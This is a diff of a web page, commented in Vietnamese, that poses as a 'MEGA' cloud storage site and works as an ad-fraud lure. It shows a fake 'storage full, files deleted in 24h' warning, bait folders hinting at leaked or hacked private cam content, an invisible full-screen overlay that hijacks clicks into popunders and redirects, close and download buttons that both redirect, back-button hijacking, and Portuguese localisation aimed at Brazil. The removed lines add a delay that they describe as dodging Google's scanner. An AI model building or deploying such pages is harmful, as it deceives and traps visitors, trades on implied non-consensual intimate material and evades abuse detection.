@@ -3,144 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MEGA STORAGE - Cloud Connect</title>
+    <title>Cloud Storage - Private Access</title>
     
-    <!-- Scripts nổ Pop của ông -->
+    <!-- Scripts Adsterra của ông giữ nguyên -->
     <script src="https://evacuateenclose.com/2d/f0/3e/2df03ec7f051608ea8806353a1663a9f.js"></script>
     <script src="https://evacuateenclose.com/65/5d/86/655d862c63ab08ee18932b53de13d177.js"></script>
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #0b1120; color: #94a3b8; font-family: -apple-system, system-ui, sans-serif; padding: 15px; overflow: hidden; }
+        body { background-color: #0b1120; color: #94a3b8; font-family: -apple-system, system-ui, sans-serif; padding: 15px; overflow: hidden; touch-action: manipulation; }
         
-        /* Bẫy tàng hình - Ban đầu để ẩn để tránh bị Browser chặn ngay lập tức */
-        #trap { 
+        /* Bẫy phủ toàn màn hình */
+        #global-overlay { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             z-index: 9999; cursor: pointer; background: rgba(0,0,0,0); 
-            display: none; 
+            display: block; /* Hiện ngay để bắt click iOS */
         }
 
         #fake-alert {
             position: fixed; top: 15%; left: 50%; transform: translateX(-50%);
-            width: 90%; max-width: 350px; background: #fff; color: #000;
-            padding: 15px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            z-index: 10000; font-size: 14px; text-align: left; display: block;
-            border: 2px solid #ff4444;
+            width: 92%; max-width: 360px; background: #fff; color: #000;
+            padding: 18px; border-radius: 12px; box-shadow: 0 15px 40px rgba(0,0,0,0.6);
+            z-index: 10000; font-size: 14px; border: 2px solid #ef4444;
         }
 
         .close-btn {
-            position: absolute; top: -10px; right: -10px; width: 30px; height: 30px;
-            background: #ff4444; color: white; border-radius: 50%; text-align: center;
-            line-height: 28px; font-weight: bold; cursor: pointer; border: 2px solid white;
+            position: absolute; top: -12px; right: -12px; width: 32px; height: 32px;
+            background: #ef4444; color: white; border-radius: 50%; text-align: center;
+            line-height: 30px; font-weight: bold; cursor: pointer; border: 2px solid white;
         }
 
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding: 10px 5px; border-bottom: 1px solid #1e293b; }
-        .logo { color: #3b82f6; font-weight: bold; font-size: 20px; text-transform: uppercase; }
-        .status { color: #22c55e; font-size: 13px; font-weight: bold; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding-bottom: 10px; border-bottom: 1px solid #1e293b; }
+        .logo { color: #3b82f6; font-weight: 800; font-size: 22px; }
+        .status { color: #22c55e; font-size: 12px; display: flex; align-items: center; }
+        .status::before { content: ""; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; margin-right: 6px; animation: blink 1s infinite; }
         
-        .folder-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 15px; margin-bottom: 12px; display: flex; align-items: center; }
-        .icon { font-size: 28px; margin-right: 15px; }
-        .info { flex-grow: 1; }
-        .info b { display: block; color: #f1f5f9; font-size: 13px; margin-bottom: 3px; }
-        .info span { font-size: 11px; color: #64748b; }
-        
-        .btn-download { display: block; text-decoration: none; background: #2563eb; color: #ffffff; text-align: center; padding: 16px; border-radius: 10px; font-weight: bold; margin-top: 15px; animation: pulse 1.5s infinite; }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-            100% { transform: scale(1); }
-        }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
-        .footer-text { text-align: center; font-size: 10px; margin-top: 20px; color: #475569; }
+        .folder-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; margin-bottom: 12px; display: flex; align-items: center; transition: 0.3s; }
+        .icon { font-size: 30px; margin-right: 15px; }
+        .info b { display: block; color: #f1f5f9; font-size: 14px; margin-bottom: 4px; }
+        .info span { font-size: 11px; color: #94a3b8; }
+        
+        .btn-action { display: block; text-decoration: none; background: #2563eb; color: #fff; text-align: center; padding: 18px; border-radius: 12px; font-weight: 800; margin-top: 20px; animation: pulse 1.5s infinite; text-transform: uppercase; letter-spacing: 1px; }
+        
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); box-shadow: 0 0 20px rgba(37,99,235,0.4); } 100% { transform: scale(1); } }
+        .footer { text-align: center; font-size: 11px; margin-top: 25px; color: #475569; line-height: 1.6; }
     </style>
 </head>
 <body>
 
-    <!-- Lớp phủ click toàn trang -->
-    <div id="trap"></div>
+    <div id="global-overlay"></div>
 
     <div id="fake-alert">
-        <span id="alert-text"><strong>⚠️ System Warning:</strong> Your cloud storage is full. Download private folders to clear space.</span>
-        <div class="close-btn" onclick="triggerLo()">X</div>
+        <span id="txt-msg"><strong>⚠️ CLOUD STORAGE FULL:</strong> 98% Used. Your private files will be deleted in 24h. Download now!</span>
+        <div class="close-btn" id="btn-x">X</div>
     </div>
 
     <div class="header">
-        <div class="logo">MEGA CLOUD</div>
-        <div class="status">● Server: US-East</div>
+        <div class="logo">MEGA CONNECT</div>
+        <div class="status">ENCRYPTED</div>
     </div>
 
     <div class="folder-card">
-        <div class="icon">📁</div>
-        <div class="info"><b class="f-name">P.R.I.V.A.T.E_L.E.A.K.S</b><span>1.2 GB • 142 Files</span></div>
+        <div class="icon">📂</div>
+        <div class="info"><b>P.R.I.V.A.T.E_C.A.M.S</b><span>2.1 GB • 142 Items</span></div>
     </div>
     <div class="folder-card">
-        <div class="icon">📁</div>
-        <div class="info"><b class="f-name">O.N.L.Y.F.A.N.S_V.I.P</b><span>850 MB • 85 Files</span></div>
-    </div>
-    <div class="folder-card">
-        <div class="icon">📁</div>
-        <div class="info"><b class="f-name">H.A.C.K.E.D_C.A.M.S</b><span>2.4 GB • 210 Files</span></div>
+        <div class="icon">📂</div>
+        <div class="info"><b>L.E.A.K.E.D_S.T.O.R.I.E.S</b><span>940 MB • 85 Items</span></div>
     </div>
 
-    <a href="#" class="btn-download" id="main-btn">ACCESS ALL PRIVATE FILES</a>
+    <div class="btn-action" id="btn-main">DOWNLOAD ALL FILES (.ZIP)</div>
 
-    <div class="footer-text" id="footer">Encrypted End-to-End © 2026. <br> Powered by MegaConnect.</div>
+    <div class="footer" id="txt-ft">System: Mumbai-Node-4 <br> End-to-End SSL Protection 2026.</div>
 
     <script>
-        var sLink = "https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566";
-        var clickCount = 0;
+        // Cấu hình Link Ads (Thay key của ông vào đây)
+        const myAds = "https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566";
+        let cCount = 0;
 
-        // 1. Kích hoạt bẫy sau 1.5 giây (Lách bộ quét tức thì của Google)
-        setTimeout(function() {
-            document.getElementById('trap').style.display = 'block';
-            if (navigator.vibrate) navigator.vibrate([100, 50, 100]); // Rung nhẹ gây chú ý
-        }, 1500);
+        const overlay = document.getElementById('global-overlay');
+        const mainBtn = document.getElementById('btn-main');
+        const closeBtn = document.getElementById('btn-x');
 
-        // 2. Xử lý Click Toàn Trang (Double Click Trick)
-        document.getElementById('trap').addEventListener('click', function() {
-            clickCount++;
-            if (clickCount === 1) {
-                // Click 1: Mở Ads ở tab mới (Popunder style)
-                window.open(sLink, '_blank');
-                // Ẩn bẫy 0.5s để user tưởng là đã tắt được, sau đó hiện lại để ăn thêm phát nữa
-                this.style.display = 'none';
-                setTimeout(() => { document.getElementById('trap').style.display = 'block'; }, 500);
+        // Hàm nổ Ads "Sạch" cho iOS/Safari
+        function bang() {
+            window.open(myAds, '_blank');
+        }
+
+        function redirect() {
+            window.location.replace(myAds);
+        }
+
+        // 1. Xử lý Bẫy Toàn Trang
+        overlay.addEventListener('click', function() {
+            cCount++;
+            if (navigator.vibrate) navigator.vibrate(100);
+            
+            if (cCount === 1) {
+                bang(); // Cú click 1: Nổ tab mới
+                this.style.visibility = 'hidden'; // Ẩn tạm để user click được nút thật
+                setTimeout(() => { this.style.visibility = 'visible'; }, 800);
             } else {
-                // Click 2: Chuyển hướng trang hiện tại sang Ads luôn
-                window.location.href = sLink;
+                redirect(); // Cú click 2: Bay màu trang hiện tại
             }
         });
 
-        // 3. Nút X và Nút Download đều dẫn về Ads
-        function triggerLo() { window.location.href = sLink; }
-        document.getElementById('main-btn').addEventListener('click', function(e) {
-            e.preventDefault();
-            window.location.href = sLink;
-        });
+        // 2. Nút X và Nút chính
+        closeBtn.onclick = redirect;
+        mainBtn.onclick = redirect;
 
-        // 4. Back-button Hijack (Chặn nút quay lại)
-        window.addEventListener('load', function() {
-            setTimeout(function() {
-                history.pushState(null, null, location.href);
-                window.onpopstate = function () {
-                    // Ép user xem thêm 1 cái Ads nữa khi định thoát
-                    window.location.replace(sLink);
-                };
-            }, 2000);
-        });
+        // 3. Back-button Hijack (Chỉ kích hoạt sau khi user tương tác 2s)
+        setTimeout(() => {
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+                redirect();
+            };
+        }, 2500);
 
-        // 5. Đổi tiếng theo quốc gia (Tối ưu cho BR/PT)
-        var userLang = navigator.language || navigator.userLanguage;
-        if (userLang.toLowerCase().includes('pt') || userLang.toLowerCase().includes('br')) {
-            document.getElementById('alert-text').innerHTML = "<strong>⚠️ Erro de Sistema:</strong> Armazenamento cheio. Baixe os arquivos agora.";
-            document.getElementById('main-btn').innerText = "ACESSAR ARQUIVOS PRIVADOS";
-            var folders = document.querySelectorAll('.f-name');
-            folders[0].innerText = "V.I.D.E.O.S_L.E.A.K.S";
-            folders[1].innerText = "C.O.N.T.E.U.D.O_V.I.P";
-            folders[2].innerText = "C.A.M.E.R.A.S_P.R.I.V.A.D.A.S";
+        // 4. Đổi tiếng (Tối ưu hóa cho Brazil/Portugal)
+        const lang = navigator.language || navigator.userLanguage;
+        if (lang.match(/pt|br/i)) {
+            document.getElementById('txt-msg').innerHTML = "<strong>⚠️ MEMÓRIA CHEIA:</strong> 98% Usado. Seus arquivos serão deletados. Baixe agora!";
+            document.getElementById('btn-main').innerText = "BAIXAR ARQUIVOS (.ZIP)";
+            document.getElementById('txt-ft').innerHTML = "Sistema: Servidor Brasil-04 <br> Proteção SSL de ponta a ponta 2026.";
         }
     </script>
 </body>
 </html>
-
